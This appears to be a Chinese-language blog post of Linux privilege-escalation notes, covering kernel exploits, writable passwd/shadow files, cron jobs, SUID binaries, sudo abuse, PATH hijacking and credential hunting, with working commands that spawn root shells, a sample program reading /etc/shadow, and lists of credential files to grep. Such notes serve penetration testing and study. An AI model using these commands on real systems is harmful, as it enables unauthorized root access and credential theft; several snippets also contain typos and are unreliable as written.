---
title: Linux权限提升
description: Linux权限提升方式
categories:
 - Linux
tags:
 - Linux
---

### 内核溢出提权（linux-kernel-exploits）
可以用使用`uname -a`查看内核版本，使用`cat /etc/issue`和`cat /etc/*-release`查看发行版

根据内核和发行版版本可以使用[SecWiki提权合集](https://github.com/SecWiki/linux-kernel-exploits)或者kali上searchsploit来搜索exploitdb的利用代码，需要根据系统情况对exp进行调整，比如磁盘格式和编译好的兼容性

### passwd和shadow提权
`/etc/passwd`文件如果普通用户可写，就可以将root用户的密码字段（一般显示*）号，修改成已知密码的hash

`/etc/shadow`文件如果普通用户可读，就可以读取root的hash，然后尝试暴力破解

### 计划任务提权 
系统内执行的定时任务，一般是由crontab来管理，一般这些定时任务程序由所属用户的权限，以root权限执行，如果其中一个程序可被当前用户写，被root执行，就可以在程序中添加反弹shell等获取root权限

检查列表
```
crontab -l
ls -la /etc/cron*
ls -la /etc/ | grep cron
ls -alh /var/spool/cron
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SUID
使用命令获取SUID执行的文件
```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm +2000 -user root -type f -print
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

比如
``` 
# suid.c
# inclue <stdlib.h>
# include <unistd.h>

int main() 
{
    setuid(0);
    system("id");
    system("cat /etc/shadow");
}

gcc suid.c -o suid-exp  # root编译
chmod 4755 ./suid-exp  # 设置suid位
```

普通用户获取到这个程序时，一方面可以直接用这个程序读取`/etc/shadow`，已经算提升权限了，这方面的问题比较少，只有nmap这种有交互shell的程序可能会比较有用，还有编辑器、解释器、编译器程序，另一方面，上面system函数继承当前用户的环境变量，可以设置PATH的环境变量优先找到自己修改cat命令，借此提权

### SUDO提权
`sudo -l`可以查看可用于sudo的程序

`sudo find /home -exec sh -i \;`，查找命令的exec参数可以用于任意代码执行

`sudo python -c 'import pty;pty.spawn('/bin/bash');`，给语言编辑器、解释器等赋予SUDO权限也可以提权

### PATH变量的优先环境提权
除了上面提到的还有当root用户的PATH变量中存在`.`时，可以诱骗root用户到某个目录下，比如执行`ls`命令，在当前目录添加一个ls的反弹shell，就可以获取权限

### 攻击以root权限运行的服务
`ps -aux | grep root`

比如连接MySQL后用MySQL注入的方式获取shell或者获取有root的权限的webshell

获取这些服务的位置，查看是否有可写入的地方，就可以修改启动程序，等待服务重启

### 找到明文存储的用户名和密码
```
/var/apache2/config.inc
/var/lib/mysql/mysql/user.MYD
/root/anaconda-ks.cfg
~/.bash_history
~/.nano_history
~/.atftp_history
~/.mysql_history
~/.php_history
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
grep . -name "*.php" -printO | xargs -O grep -i -n "var $password"
```

### 参考文档

https://www.xmsec.cc/guide-linux-privilege-escalation/

